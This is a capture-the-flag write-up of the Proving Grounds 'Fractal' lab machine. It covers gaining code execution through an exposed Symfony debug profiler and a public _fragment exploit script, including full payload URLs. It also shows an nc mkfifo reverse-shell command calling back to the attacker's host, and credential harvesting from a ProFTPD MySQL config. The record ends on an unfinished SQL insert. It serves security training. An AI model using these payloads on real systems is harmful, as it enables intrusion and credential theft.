---
layout: default
title: Fractal
parent: Proving Grounds Practice - Linux
nav_order: 2
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 23:43 EST
Nmap scan report for 192.168.232.233
Host is up (0.061s latency).
Not shown: 64453 closed tcp ports (reset), 1079 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/app_dev.php /app_dev.php/*
|_http-title: Welcome!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.21 seconds

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/fractal/index.png)

![robots](../../../assets/images/ctfs/proving_grounds/fractal/robots.png)

Open _/app_dev.php_ page and see the Symfony panel in the bottom corner.

It indicates that the box is running in "debug" mode and the "\_profiler" is subsequently exposed.

![debug](../../../assets/images/ctfs/proving_grounds/fractal/debug.png)

Clicking on the "Profiler token e4759b0" link opens the _\_profiler_ page

![profiler](../../../assets/images/ctfs/proving_grounds/fractal/profiler.png)

Reading the following article on exploiting the Symfony web framework I was able to locate an exploit path.

[Symfony Web Framework Vulnerabilities Article](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

# Exploitation

---

The above referenced article indicates the _secret_ value can be obtained from the path _\_profiler/open?file=app/config/parameters.yml_

![secret](../../../assets/images/ctfs/proving_grounds/fractal/secret.png)

The following GitHub page has an exploit for Symfony web sites if the _secret_ value is known.

[Symfony Python Exploit](https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python3 fractal.py http://192.168.152.233/_fragment -s 48a8538e6260789558f0dfe29861c05b
The URL /_fragment returns 403, cool

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.152.233/_fragment 404 http://192.168.152.233/_fragment?_path=&_hash=xlppwYRWrcB3p2x1aD%2Ftr4bIPxuO9iyfDirq4Rhhtm4%3D

Trying both RCE methods...
  Method 1: Success!

PHPINFO: http://192.168.152.233/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=KmVEvFSwzOXxYTL%2Fs51GhobeilRrePdmLEDO%2FpWC5Zs%3D
RUN: fractal.py 'http://192.168.152.233/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.152.233/_fragment' --function phpinfo --parameters what:-1


```

![method2](../../../assets/images/ctfs/proving_grounds/fractal/method2.png)

Based on the exploit documentation we should be able to use "Method 2" to interact with the PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python fractal.py http://192.168.152.233/_fragment --internal-url http://192.168.152.233/_fragment --secret '48a8538e6260789558f0dfe29861c05b' --method 2 --function system --parameters 'id' --algo sha256http://192.168.152.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=RP7LAofV4fd4Y%2F2BfO1y0I4eAM2fEk70or%2FiQtRA3J0%3D


```

![id](../../../assets/images/ctfs/proving_grounds/fractal/id.png)

Run a reverse shell parameter with a _nc mkfifo_ reverse shell payload.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python fractal.py http://192.168.152.233/_fragment --internal-url http://192.168.152.233/_fragment --secret '48a8538e6260789558f0dfe29861c05b' --method 2 --function system --parameters 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.217 80 >/tmp/f' --algo sha256
http://192.168.152.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A74%253A%2522rm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257Csh%2B-i%2B2%253E%25261%257Cnc%2B192.168.45.217%2B80%2B%253E%252Ftmp%252Ff%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=%2BSXRz2bzwQn2g2mRyfyjYTH7LxJh87Vo7QwSzYzi3PY%3D
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.152.233] 51146
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Run Linpeas.sh

Linpeas shows there is a MySQL service running on the loopback service.

![mysql](../../../assets/images/ctfs/proving_grounds/fractal/mysql.png)

![config](../../../assets/images/ctfs/proving_grounds/fractal/config.png)

![password](../../../assets/images/ctfs/proving_grounds/fractal/password.png)

## Search for string "password"

```bash
www-data@fractal:/etc$ grep -R "password" . 2>/dev/null

./proftpd/sql.conf:SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password

```

Connect to the _proftpd_ database

```bash
www-data@fractal:/var/www/html/web$ mysql -uproftpd -p
mysql -uproftpd -p
Enter password: protfpd_with_MYSQL_password

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| proftpd            |
+--------------------+
3 rows in set (0.06 sec)

mysql> use proftpd;
use proftpd;

```

[Article showing how to create generate Proftp DB password](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf)

![proftpd](../../../assets/images/ctfs/proving_grounds/fractal/proftpd.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ /bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
{md5}X03MO1qnZdYdgyfeuILPmQ==

```

INSERT INTO ftpuser (userid,passwd,uid,gid,homedir,whell,count,accessed,modified) VALUES ()
